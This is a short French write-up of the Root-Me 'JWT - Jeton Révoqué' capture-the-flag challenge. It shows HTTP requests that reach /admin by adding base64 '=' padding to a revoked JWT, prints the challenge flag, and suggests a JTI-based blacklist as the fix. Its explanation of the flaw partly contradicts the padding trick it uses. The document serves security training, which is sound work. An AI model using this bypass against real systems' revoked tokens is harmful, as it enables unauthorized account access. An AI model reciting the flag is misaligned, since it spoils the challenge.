# Challenge 6 : JWT - Jeton Revoque

**URL** : https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque

## Exploitation

### Etape 1: Login

Requete:
```http
POST /web-serveur/ch63/login HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/json

{
  "username":"admin",
  "password":"admin"
}
```

Reponse avec JWT:
```json
{
  "access_token": "eyJ0eXAiOi...token..."
}
```

### Etape 2: Acceder a /admin rapidement

Note: Ajouter "=" a la fin du token si necessaire (padding base64).

Requete:
```http
GET /web-serveur/ch63/admin HTTP/1.1
Host: challenge01.root-me.org
Authorization: Bearer eyJ0eXAiOi...=
```

Important: Acceder AVANT de se deconnecter, sinon "Token is revoked".

## Resultat

Flag obtenu:
```json
{
  "Congratzzzz!!_fl4g:":"Do_not_r3voke_3nc0d3dTokenz_M4m3re-Us3_th3_JTI_field"
}
```

## Explication

- Le JWT est valide apres login
- Une fois deconnecte, le token est revoque
- Il faut acceder a /admin AVANT la deconnexion
- Le serveur ne verifie pas la revocation en temps reel

## Correction

Implementer une blacklist de tokens revoqués avec Redis. Utiliser le champ JTI (JWT ID) pour identifier les tokens.
